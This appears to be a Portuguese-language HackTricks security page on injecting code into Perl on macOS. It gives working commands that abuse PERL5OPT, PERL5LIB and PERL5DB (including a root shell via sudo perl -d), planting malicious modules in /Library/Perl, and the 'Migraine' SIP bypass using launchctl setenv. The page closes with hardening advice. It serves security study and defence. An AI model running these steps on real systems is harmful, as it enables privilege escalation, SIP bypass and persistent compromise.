# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Usando a env variable **`PERL5OPT`**, é possível fazer o **Perl** executar comandos arbitrários quando o interpretador é iniciado (até mesmo **antes que a primeira linha do script-alvo seja analisada**).
Por exemplo, crie este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Agora **exporte a variável de ambiente** e execute o script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Outra opção é criar um módulo Perl (por exemplo, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E então use as variáveis de ambiente para que o módulo seja localizado e carregado automaticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Outras environment variables interessantes

* **`PERL5DB`** – quando o interpretador é iniciado com a flag **`-d`** (debugger), o conteúdo de `PERL5DB` é executado como código Perl *dentro* do contexto do debugger.
Se você puder influenciar tanto o environment quanto as command-line flags de um processo Perl privilegiado, poderá fazer algo como:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – no Windows, essa variável controla qual shell executable o Perl usará quando precisar iniciar um shell. Ela é mencionada aqui apenas por completude, pois não é relevante no macOS.

Embora `PERL5DB` exija o switch `-d`, é comum encontrar scripts de manutenção ou instalação executados como *root* com essa flag habilitada para troubleshooting detalhado, tornando a variável um vetor de escalation válido.

## Via dependencies (@INC abuse)

É possível listar o include path que o Perl pesquisará (**`@INC`**) executando:
```bash
perl -e 'print join("\n", @INC)'
```
A saída típica no macOS 13/14 é semelhante a:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algumas das pastas retornadas nem sequer existem; no entanto, **`/Library/Perl/5.30`** existe, *não* é protegida pelo SIP e está *antes* das pastas protegidas pelo SIP. Portanto, se você puder escrever como *root*, poderá inserir um módulo malicioso (por exemplo, `File/Basename.pm`) que será carregado *preferencialmente* por qualquer script privilegiado que importe esse módulo.

> [!WARNING]
> Você ainda precisa de **root** para escrever dentro de `/Library/Perl`, e o macOS exibirá um prompt do **TCC** solicitando *Full Disk Access* para o processo que realizar a operação de escrita.

Por exemplo, se um script importar **`use File::Basename;`**, seria possível criar `/Library/Perl/5.30/File/Basename.pm` contendo código controlado pelo atacante.

## Bypass do SIP via Migration Assistant (CVE-2023-32369 “Migraine”)

Em maio de 2023, a Microsoft divulgou o **CVE-2023-32369**, apelidado de **Migraine**, uma técnica de post-exploitation que permite a um atacante com *root* **bypassar completamente o System Integrity Protection (SIP)**.
O componente vulnerável é o **`systemmigrationd`**, um daemon com o entitlement **`com.apple.rootless.install.heritable`**. Qualquer processo filho criado por esse daemon herda o entitlement e, consequentemente, é executado **fora das restrições do** SIP.<sup>[1]</sup>

Entre os processos filhos identificados pelos pesquisadores está o interpretador assinado pela Apple:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Como o Perl respeita `PERL5OPT` (e o Bash respeita `BASH_ENV`), envenenar o *ambiente* do daemon é suficiente para obter execução arbitrária em um contexto sem SIP:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Quando `migrateLocalKDC` é executado, `/usr/bin/perl` inicia com o `PERL5OPT` malicioso e executa `/private/tmp/migraine.sh` *antes que o SIP seja reabilitado*. A partir desse script, você pode, por exemplo, copiar um payload para dentro de **`/System/Library/LaunchDaemons`** ou atribuir o extended attribute `com.apple.rootless` para tornar um arquivo **indeleável**.

A Apple corrigiu o problema no macOS **Ventura 13.4**, **Monterey 12.6.6** e **Big Sur 11.7.7**, mas sistemas antigos ou sem patch continuam exploráveis.<sup>[1]</sup>

## Recomendações de hardening

1. **Limpe variáveis perigosas** – launchdaemons privilegiados ou cron jobs devem iniciar com um ambiente limpo (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Evite executar interpreters como root** a menos que seja estritamente necessário. Use binários compilados ou remova privilégios antecipadamente.
3. **Forneça scripts com `-T` (taint mode)** para que o Perl ignore `PERL5OPT` e outras opções inseguras quando o taint checking estiver habilitado.
4. **Mantenha o macOS atualizado** – “Migraine” está totalmente corrigido nas versões atuais.

## Referências

- [1] [Microsoft Security Blog – Nova vulnerabilidade do macOS, Migraine, pode contornar o System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
